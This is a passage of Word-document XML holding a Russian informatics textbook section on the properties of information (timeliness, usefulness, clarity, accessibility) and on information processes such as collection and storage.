    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Факторы актуальности</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Скорость изменения данных**: Курс валют меняется ежесекундно, а исторические факты — никогда</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Момент использования**: Информация может быть актуальной для одного момента и неактуальной для другого</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Скорость доставки**: Информация должна поступить вовремя</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример</w:t>
      </w:r>
      <w:r>
        <w:t>: Информация "На дороге пробка" актуальна для водителя, который сейчас едет, но неактуальна через 3 часа, когда пробка рассосётся, или для водителя, который уже проехал этот участок.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Информационное старение</w:t>
      </w:r>
      <w:r>
        <w:t>: Некоторая информация быстро теряет актуальность (новости, котировки акций), другая остаётся актуальной долго (научные законы, исторические события, справочная информация).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>6. Полезность (ценность, релевантность)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Полезность информации</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — это способность информации удовлетворить информационные потребности получателя, помочь в решении задачи или достижении цели.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Это свойство тесно связано с </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>прагматической мерой информации</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (глава 1.5) — ценностью информации для конкретного получателя.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Полезная информация</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> помогает решить задачу, принять решение, достичь цели.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Бесполезная информация</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> не имеет практической ценности для получателя в данный момент.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Примеры</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">✅ </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Полезная информация</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Инструкция по ремонту конкретной модели автомобиля для автомеханика, работающего с этой моделью</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Информация о погоде для организатора уличного мероприятия</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Данные о конкурентах для маркетолога</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">❌ </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Бесполезная информация</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Инструкция по ремонту автомобиля для программиста (если он не собирается ремонтировать машину)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Рецепты блюд для человека, который сейчас выбирает телефон</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>"Информационный шум" — случайные, не относящиеся к делу сведения</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Факторы полезности</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Релевантность**: Соответствие информации потребностям и запросу</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Контекст**: Полезность зависит от ситуации и целей получателя</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Знания получателя** (тезаурус): Для специалиста одна информация полезна, для новичка — другая</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример</w:t>
      </w:r>
      <w:r>
        <w:t>: Информация "В Python индексация списков начинается с 0" очень полезна для начинающего программиста Python, но бесполезна для опытного (он это уже знает) и для человека, не занимающегося программированием.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>7. Понятность (ясность)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Понятность информации</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — это доступность информации для восприятия и понимания получателем, соответствие формы представления информации знаниям получателя.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Информация может быть выражена на языке, непонятном получателю, или в форме, требующей специальных знаний для интерпретации.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Понятная информация</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> представлена в форме, доступной для восприятия получателем (на знакомом языке, в знакомых обозначениях).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Непонятная информация</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> требует дополнительных знаний, перевода, расшифровки.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Примеры</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">✅ </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Понятная информация</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Текст на родном языке получателя</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Диаграммы и графики с подписями</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Объяснения с примерами и аналогиями</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">❌ </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Непонятная информация</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Текст на незнакомом языке</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Профессиональный жаргон для неспециалиста</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Математические формулы для человека без математической подготовки</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример</w:t>
      </w:r>
      <w:r>
        <w:t>: Медицинский диагноз "Острый катаральный ринофарингит" непонятен большинству пациентов, но "простуда с насморком" — понятно всем, хотя содержит ту же информацию.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Факторы понятности</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Язык представления**: Естественный язык (русский, английский и т.д.) или специальный (формулы, коды)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Уровень сложности**: Должен соответствовать знаниям аудитории</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Форма представления**: Текст, графика, таблицы, схемы</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Тезаурус получателя**: Запас знаний, необходимый для понимания</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Связь с семантической мерой</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (глава 1.5): Понятность связана с тезаурусом получателя — если информация выходит за пределы знаний получателя, она непонятна.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>8. Доступность</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Доступность информации</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — это возможность получить информацию в нужный момент времени, наличие технических и организационных условий для доступа к информации.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Доступная информация</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> может быть получена получателем без существенных препятствий.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Недоступная информация</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> скрыта, засекречена, требует специальных разрешений или технических средств для получения.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Примеры</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">✅ </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Доступная информация</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Публичные данные в интернете (Википедия, новостные сайты)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Информация в библиотеках</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Открытые государственные данные (открытые данные правительств)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">❌ </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Недоступная информация</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Секретные документы с ограниченным доступом</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Платная информация без подписки (платные базы данных, журналы)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Информация, требующая специального оборудования для чтения (например, данные на устаревших носителях)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Информация за "цифровым неравенством" (нет интернета, компьютера)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Факторы доступности</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Технические факторы**: Наличие интернета, компьютера, программ для чтения</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Организационные факторы**: Политика доступа (открытые/закрытые данные)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Экономические факторы**: Платность/бесплатность информации</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Юридические факторы**: Законы об информации, авторском праве, тайне</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Языковые барьеры**: Информация на недоступном языке</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример</w:t>
      </w:r>
      <w:r>
        <w:t>: Научная статья может быть опубликована (существует), но недоступна для студента, у которого нет подписки на журнал. Или информация может быть доступна, но на китайском языке, что делает её недоступной для тех, кто не знает китайский.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Взаимосвязь свойств информации</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Важно понимать, что свойства информации </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>взаимосвязаны</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> и </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>взаимозависимы</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Объективная** информация обычно более **достоверна**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Достоверная** и **полная** информация более **полезна**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Актуальная** информация имеет более высокую **ценность** (полезность)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Понятная** информация более **полезна** для получателя</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Доступная** информация может быть использована, что делает её **полезной**</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Однако возможны и противоречия:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Информация может быть **объективной**, но **непонятной** (научный доклад для неспециалиста)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Информация может быть **доступной**, но **недостоверной** (фейки в интернете)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Информация может быть **полной** и **достоверной**, но **неактуальной** (устаревшие данные)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Для практического использования необходимо оценивать информацию по всем её свойствам комплексно.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Информационные процессы</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Информационные процессы</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — это процессы, связанные с получением, хранением, обработкой, передачей и использованием информации.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Эти процессы являются предметом изучения информатики (см. главу 1.7) и происходят как в природе (в биологических системах), так и в обществе (коммуникации людей), и в технических системах (компьютерах).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>1. Сбор (получение) информации</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Сбор информации</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — это процесс получения информации из различных источников и её фиксация на материальных носителях или в памяти человека.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Источники информации</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Естественные источники**: Природные объекты и явления (наблюдение погоды, изучение животных)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Искусственные источники**: Созданные человеком (книги, базы данных, приборы)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Первичные источники**: Оригинальные данные, непосредственные наблюдения</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Вторичные источники**: Обработанные, интерпретированные данные (учебники, обзорные статьи)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Методы сбора информации</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Наблюдение**: Непосредственное восприятие объектов и явлений (визуальное наблюдение, прослушивание)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Измерение**: Использование приборов для количественной оценки (термометр, весы, датчики)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Эксперимент**: Активное воздействие на объект для выявления его свойств</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Опрос**: Получение информации от людей (анкетирование, интервью)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Анализ документов**: Изучение уже существующих источников информации</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Примеры</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Наука**: Сбор экспериментальных данных, наблюдения в телескоп, измерения приборами</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Бизнес**: Сбор данных о продажах, опросы клиентов, анализ рынка</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Медицина**: Анамнез (опрос пациента), измерение температуры, анализы</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Повседневная жизнь**: Чтение новостей, просмотр прогноза погоды, получение сообщений</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Современные средства сбора информации</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Датчики (температуры, давления, движения и др.)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Сканеры (для оцифровки документов)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Камеры (фото и видео)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Микрофоны (запись звука)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Интернет (сбор данных из онлайн-источников — веб-скрапинг)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Системы мониторинга (GPS-трекеры, системы наблюдения)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Проблемы сбора информации</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Неполнота (невозможно собрать все данные)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Ошибки измерений</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Субъективность наблюдателей</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Искажения при передаче от первоисточника</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>2. Хранение информации</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Хранение информации</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — это процесс фиксации и сохранения информации на материальных носителях для последующего использования.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Цели хранения</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Сохранение информации во времени (для будущего использования)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Накопление знаний</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Обеспечение доступа к информации в нужный момент</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Носители информации</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Естественные (биологические)</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Память человека** (нейронные связи в мозге)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**ДНК** (генетическая информация)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Искусственные</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>*Древние*:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Камень (наскальные рисунки, каменные таблички)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Глина (клинопись на глиняных табличках)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Папирус, пергамент (древние рукописи)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Бумага (книги, документы)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>*Современные*:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Магнитные носители**: Жёсткие диски (HDD), магнитные ленты</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Оптические носители**: CD, DVD, Blu-ray диски</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Полупроводниковые носители**: Флеш-память (USB-накопители, SSD), карты памяти</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Облачные хранилища**: Данные на удалённых серверах (Google Drive, Яндекс.Диск, iCloud)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
